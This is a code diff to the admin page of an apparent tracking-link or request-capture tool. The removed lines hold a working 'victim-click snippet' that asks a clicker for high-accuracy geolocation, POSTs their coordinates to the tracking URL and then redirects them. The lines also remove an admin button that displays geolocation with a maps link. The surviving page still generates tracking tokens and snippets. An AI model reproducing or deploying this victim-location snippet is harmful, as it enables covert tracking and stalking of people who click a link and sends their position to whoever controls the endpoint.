@@ -23,11 +23,6 @@ th,td{padding:8px;border:1px solid #ddd;text-align:left}
 <p class="small">Use the returned URL from register as the endpoint. Example:</p>
 <pre class="code">fetch('https://example.com', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ data: 'value' }) });</pre>
 
-<h2>Capture visitor geolocation</h2>
-<p class="small">Click to attempt to get the visitor's geolocation (will prompt the user for permission). The result shows a clickable maps link and accuracy.</p>
-<button id="geoBtn">Get geolocation</button>
-<pre id="geoResult" class="code" style="display:none;margin-top:8px;white-space:pre-wrap"></pre>
-
 <h2>Recent submissions / captured requests</h2>
 <table>
 <thead>
@@ -59,12 +54,8 @@ document.getElementById('registerBtn').addEventListener('click', function(){
   }).then(function(j){
     var el = document.getElementById('registerResult');
     var url = (location.origin || '') + j.url;
-
-    // Victim-click snippet: asks for geolocation when the victim clicks the link, then POSTs it and navigates to the target URL.
-    var geoTargetSnippet = '<a id="geoTrack" href="' + url + '">Open target</a><script>document.getElementById("geoTrack").addEventListener("click", function(e){ e.preventDefault(); var target = this.href; if (!navigator.geolocation) { window.location = target; return; } navigator.geolocation.getCurrentPosition(function(p){ fetch(target, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ latitude: p.coords.latitude, longitude: p.coords.longitude, accuracy: p.coords.accuracy, ts: Date.now() }) }).catch(function(){}); window.location = target; }, function(){ window.location = target; }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }); });<\/script>';
-
     el.style.display = 'block';
-    el.textContent = 'Token: ' + j.token + '\nURL: ' + url + '\n\nSnippet:\n' + j.snippet.replace(/\\n/g,'\n') + '\n\nTarget snippet (click triggers geolocation):\n' + geoTargetSnippet.replace(/\\n/g,'\n');
+    el.textContent = 'Token: ' + j.token + '\nURL: ' + url + '\n\nSnippet:\n' + j.snippet.replace(/\\n/g,'\n');
     btn.disabled = false;
     btn.textContent = 'Create tracking token';
   }).catch(function(err){
@@ -72,53 +63,6 @@ document.getElementById('registerBtn').addEventListener('click', function(){
     btn.disabled = false;
     btn.textContent = 'Create tracking token';
   });
-});
-
-// Geolocation feature added per request (admin UI)
-document.getElementById('geoBtn').addEventListener('click', function(){
-  var btn = this;
-  btn.disabled = true;
-  btn.textContent = 'Locating...';
-  var resultEl = document.getElementById('geoResult');
-
-  if (!navigator.geolocation) {
-    resultEl.style.display = 'block';
-    resultEl.textContent = 'Geolocation is not supported by this browser.';
-    btn.disabled = false;
-    btn.textContent = 'Get geolocation';
-    return;
-  }
-
-  navigator.geolocation.getCurrentPosition(function(p) {
-    var lat = p.coords.latitude;
-    var lon = p.coords.longitude;
-    var acc = p.coords.accuracy;
-
-    var mapsLink = 'https://www.google.com/maps?q=' + encodeURIComponent(lat + ',' + lon);
-
-    var out = '';
-    out += '🎯 COMPLETE MAPS LINK:\n' + mapsLink + '\n';
-    out += 'Latitude: ' + lat + '\n';
-    out += 'Longitude: ' + lon + '\n';
-    out += 'Accuracy: within ' + acc + ' meters.\n';
-
-    resultEl.style.display = 'block';
-    resultEl.innerHTML = out + '\n(JSON): ' + JSON.stringify({latitude: lat, longitude: lon, accuracy: acc}, null, 2);
-
-    console.log('🎯 COMPLETE MAPS LINK:');
-    console.log(mapsLink);
-    console.log('Accuracy: within ' + acc + ' meters.');
-
-    btn.disabled = false;
-    btn.textContent = 'Get geolocation';
-  }, function(e) {
-    var errMsg = 'Error: ' + (e && e.message ? e.message : e);
-    console.error(errMsg);
-    resultEl.style.display = 'block';
-    resultEl.textContent = errMsg;
-    btn.disabled = false;
-    btn.textContent = 'Get geolocation';
-  }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
 });
 </script>
 </body>
